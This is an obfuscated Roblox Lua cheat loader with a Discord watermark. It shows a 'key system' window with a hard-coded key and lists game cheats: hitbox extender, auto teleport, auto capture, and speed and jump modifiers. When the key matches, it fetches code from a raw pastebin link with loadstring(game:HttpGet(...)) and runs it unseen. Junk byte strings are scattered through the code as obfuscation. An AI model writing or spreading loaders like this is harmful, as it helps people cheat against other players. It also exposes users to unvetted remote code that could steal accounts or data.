-- This file was generated at discord.gg/syncrypt

local v189, v193, v195, v196, v198, v200, v203
local v212, v213, v214
local v163 = game:GetService("Players")
local v164 = game:GetService("TweenService")
local up25 = v164
local v165 = game:GetService("RunService")
local up26 = v165
local v167 = v163.LocalPlayer:WaitForChild("PlayerGui")
local up27 = "unskyo61"
local up28 = "https://unskyo"
local up29 = "loadstring(game:HttpGet(\"https://pastebin.com/raw/7nPuVFRm\"))()"
local v169 = v167:FindFirstChild("modernKeySystem")
if v169 then
    v167.modernKeySystem:Destroy()
end
local v171 = Instance.new("ScreenGui")
local up30 = v171
up30.Name = "modernKeySystem"
v189, v195 = "\225i;\201\n\2417\234\188\"I\225\192x", 12213054035511
up30.Parent = v167
up30.ResetOnSpawn = false
up30.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local v173 = Instance.new("Folder")
local up31 = v173
up31.Name = "snowContainer"
up31.Parent = up30
task.spawn(function()
    local v131, v132, v133, v134, v136, v137, v140
    while true do
        v131 = up30
        if not v131.Parent then
            break
        end
        v131 = Instance.new("TextLabel")
        local up1 = v131
        v136 = up1
        v133 = UDim2.new(0, 20, 0, 20)
        v136.Size = v133
        v136 = up1
        v133 = UDim2.new((math.random()), 0, -0.05, 0)
        v136.Position = v133
        v136 = up1
        v136.BackgroundTransparency = 1
        v136 = up1
        v136.Text = "."
        v136 = up1
        v133 = Color3.fromRGB(255, 140, 0)
        v136.TextColor3 = v133
        v136 = up1
        v133 = math.random(14, 24)
        v136.TextSize = v133
        v136 = up1
        v132 = Enum.Font.GothamBold
        v136.Font = v132
        v136 = up1
        v134 = math.random(30, 70)
        v136.TextTransparency = (v134 / 100)
        v136 = up1
        v136.Parent = up31
        v132 = (math.random(4, 8))
        v136 = up25
        v133 = up1
        v137 = TweenInfo.new(v132, Enum.EasingStyle.Linear)
        v140 = UDim2
        v131 = v136.Create
        v140 = v140.new(up1.Position .X.Scale, (math.random(-30, 30)), 1.1, 0)
        v131 = v131(v136, v133, v137, {["Position"] = v140})
        v136, v133 = "Play", v131
        v133:Play()
        v136 = v133.Completed
        v134 = function()
            up1:Destroy()
            return
        end
        v136:Connect(v134)
        task.wait(math.random(.2, .6))
    end
    return
end)
local v174 = Instance.new("Frame")
local up32 = v174
up32.Size = UDim2.new(0, 420, 0, 350)
v174 = up32
local v182 = UDim2
v193, v189 = 25984866135876, -175
v182 = v182.new (0.5, -210, 0.5, v189)
v174.Position = v182
up32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
up32.BackgroundTransparency = .35
up32.BorderSizePixel = 0
up32.Parent = up30
local v181 = Instance.new("UICorner")
v181.CornerRadius = UDim.new(0, 14)
v181.Parent = up32
local v184 = Instance.new("UIStroke")
local up33 = v184
up33.Color = Color3.fromRGB(255, 140, 0)
up33.Thickness = 2.5
up33.Parent = up32
task.spawn(function()
    local v149, v151, v154, v157
    local v150 = 0
    while true do
        v151 = up32
        if not v151.Parent then
            break
        end
        v149 = (v150 + ((up26.RenderStepped:Wait()) * 2))
        v154 = math
        v150 = v149
        v154 = v154.sin(v150)
        v157 = (.6 + (v154 * .4))
        v151 = up33
        v154 = Color3.fromRGB((255 * v157), (140 * v157), 0)
        v151.Color = v154
    end
    return
end)
v182 = Instance.new("TextLabel")
local v185 = UDim2.new
v193, v189 = 45, -40
v182.Size = v185(1, v189, 0, v193)
v182.Position = UDim2.new(0, 20, 0, 15)
v182.BackgroundTransparency = 1
v182.Text = "\240\159\142\131 authentication required"
v182.TextColor3 = Color3.fromRGB(255, 140, 0)
v182.TextSize = 20
v182.Font = Enum.Font.GothamBold
v185 = Enum.TextXAlignment.Left
v193, v189 = "\017\1883", "\205\190JR\162\194"
v182.TextXAlignment = v185
v182.Parent = up32
v185 = Instance.new("Frame")
local v183 = UDim2.new
v193, v189 = 0, 1
v185.Size = v183(v189, -40, v193, 45)
v185.Position = UDim2.new(0, 20, 0, 65)
v183 = Color3.fromRGB
v189, v196, v193 = 20, "\201\243&", 20
v185.BackgroundColor3 = v183(v189, 20, v193)
v185.BackgroundTransparency = 0.5
v185.BorderSizePixel = 0
v185.Parent = up32
v183 = Instance.new("UICorner")
v183.CornerRadius = UDim.new(0, 8)
v196, v189 = 8599508635556, "Instance"
v183.Parent = v185
local v186 = Instance.new("UIStroke")
v189 = Color3.fromRGB
v193, v196 = 255, "\211\230\139"
v186.Color = v189(v193, 140, 0)
v186.Thickness = 1.5
v186.Parent = v185
v189 = Instance.new("TextBox")
local up34 = v189
up34.Size = UDim2.new(1, -20, 1, 0)
up34.Position = UDim2.new(0, 10, 0, 0)
v189 = up34
v196, v193 = "{A\142\229C\139\132\029\142\t2\217C\130\173", 1
v189.BackgroundTransparency = v193
up34.PlaceholderText = "enter key here..."
up34.PlaceholderColor3 = Color3.fromRGB(150, 100, 50)
up34.Text = ""
up34.TextColor3 = Color3.fromRGB(255, 255, 255)
up34.TextSize = 14
up34.Font = Enum.Font.GothamMedium
up34.ClearTextOnFocus = false
up34.Parent = v185
local v188 = Instance.new("TextLabel")
local up35 = v188
up35.Size = UDim2.new(1, -40, 0, 20)
up35.Position = UDim2.new(0, 20, 0, 115)
up35.BackgroundTransparency = 1
up35.Text = ""
up35.TextColor3 = Color3.fromRGB(255, 140, 0)
up35.TextSize = 13
up35.Font = Enum.Font.Gotham
up35.TextXAlignment = Enum.TextXAlignment.Left
up35.Parent = up32
v193 = Instance.new("TextButton")
v193.Size = UDim2.new(.48, -10, 0, 40)
v196, v198 = "UDim2", "p\1623"
v193.Position = UDim2.new(0, 20, 0, 140)
v193.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
v193.BackgroundTransparency = .1
v193.AutoButtonColor = false
v193.Text = "submit"
v193.TextColor3 = Color3.fromRGB(0, 0, 0)
v193.TextSize = 14
v193.Font = Enum.Font.GothamBold
v193.Parent = up32
local v197 = Instance.new("UICorner")
v197.CornerRadius = UDim.new(0, 8)
v197.Parent = v193
local v199 = Instance.new("UIStroke")
v199.Color = Color3.fromRGB(255, 140, 0)
v199.Thickness = 1
v199.Parent = v193
v196 = Instance.new("TextButton")
v196.Size = UDim2.new(.48, -10, 0, 40)
v196.Position = UDim2.new(.52, 0, 0, 140)
v196.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
v196.BackgroundTransparency = .1
v196.AutoButtonColor = false
v196.Text = "get key"
v196.TextColor3 = Color3.fromRGB(0, 0, 0)
v196.TextSize = 14
v196.Font = Enum.Font.GothamBold
v196.Parent = up32
local v201 = Instance.new("UICorner")
v201.CornerRadius = UDim.new(0, 8)
v201.Parent = v196
local v202 = Instance.new("UIStroke")
v202.Color = Color3.fromRGB(255, 140, 0)
v202.Thickness = 1
v202.Parent = v196
local v204 = Instance.new("TextLabel")
v204.Size = UDim2.new(1, -40, 0, 20)
v204.Position = UDim2.new(0, 20, 0, 195)
v204.BackgroundTransparency = 1
v204.Text = "included features:"
v204.TextColor3 = Color3.fromRGB(255, 140, 0)
v204.TextSize = 13
v204.Font = Enum.Font.GothamBold
local v205 = Enum.TextXAlignment
v200, v203 = 25710253190852, "#SL["
v204.TextXAlignment = v205.Left
v204.Parent = up32
v198 = Instance.new("Frame")
v198.Size = UDim2.new(1, -40, 0, 110)
v198.Position = UDim2.new(0, 20, 0, 220)
v198.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
v198.BackgroundTransparency = 0.5
v198.BorderSizePixel = 0
v198.Parent = up32
v188 = Instance.new
v203, v200 = "b34C\247\219\198\242", 3915163240223
v205 = v188("UICorner")
v205.CornerRadius = UDim.new(0, 8)
v195, v200 = 23452375116456, "\004\207\255"
v205.Parent = v198
local v206 = Instance
v200, v195 = "\222Z\128/\236\205\000\194", 10160464695931
v206 = v206.new ("UIStroke")
v206.Color = Color3.fromRGB(255, 140, 0)
v206.Thickness = 1
v203, v200 = "\020\160\235\192\161\196", 6676269157412
v206.Parent = v198
local v207 = Instance.new("UIListLayout")
v207.SortOrder = Enum.SortOrder.LayoutOrder
v207.Padding = UDim.new(0, 4)
v195, v200 = 32331988695759, "\1566\148\240\139P"
v207.Parent = v198
local v208 = Instance.new("UIPadding")
local v209 = UDim.new
v200, v195 = 0, 8
v208.PaddingTop = v209(v200, v195)
v208.PaddingBottom = UDim.new(0, 8)
v208.PaddingLeft = UDim.new(0, 10)
v209 = UDim.new
v200, v195 = 0, 10
v208.PaddingRight = v209(v200, v195)
v208.Parent = v198
v195 = "walkspeed:walkspeed modifier"
local v210 = "jumppower:jumppower modifier"
v188 = {"hitbox:hitbox extender", "auto tp:auto teleport", "auto capture:auto capture", v195, v210}
for v195, v210 in ipairs(v188) do
    v212 = Instance.new("TextLabel")
    v214 = UDim2.new(1, 0, 0, 16)
    v212.Size = v214
    v212.BackgroundTransparency = 1
    v212.Text = v210
    v214 = Color3.fromRGB(220, 220, 220)
    v212.TextColor3 = v214
    v212.TextSize = 11
    v213 = Enum.Font.GothamMedium
    v212.Font = v213
    v213 = Enum.TextXAlignment.Left
    v212.TextXAlignment = v213
    v212.Parent = v198
end
v196.MouseButton1Click:Connect(function()
    local v41
    local v39 = function()
        setclipboard(up28)
        return
    end
    local v40 = pcall(v39)
    if v40 then
        v41 = up35
        v41.Text = "discord has been copided to clipbord (key is in discord)"
    else
        v41 = up35
        v41.Text = "failed to copy link (executor unsupported)"
    end
    return
end)
v209 = v193.MouseButton1Click
v200 = function()
    local v47, v48, v50, v51, v52, v55, v56, v58
    local v46 = up34
    if (v46["Text"] == up27) then
        v50 = up35
        v50.Text = "success! loading script..."
        v50 = up25
        v46 = up32
        v47 = TweenInfo.new(.3)
        v51, v52 = {["BackgroundTransparency"] = 1}, v50.Create
        v52 = v52(v50, v46, v47, v51)
        v50, v46 = "Play", v52
        v46:Play()
        v46.Completed:Wait()
        up30:Destroy()
        v47 = function()
            loadstring(up29)()
            return
        end
        v55, v56 = pcall(v47)
        v50 = (not v55)
        v51 = v56
        if v50 then
            warn(("failed to load target script: " .. (tostring(v51))))
        end
    else
        v50 = up35
        v50.Text = "invalid"
        v52 = up32
        v47 = 3
        v50 = v52.Position
        v48, v46 = 1, v50
        for v51 = 1, v47, v48 do
            v50 = up32
            v58 = UDim2.new(0, (math.random(-4, 4)), 0, 0)
            v50.Position = (v46 + v58)
            task.wait(.04)
        end
        v50 = up32
        v50.Position = v46
    end
    return
end
v209:Connect(v200)

return
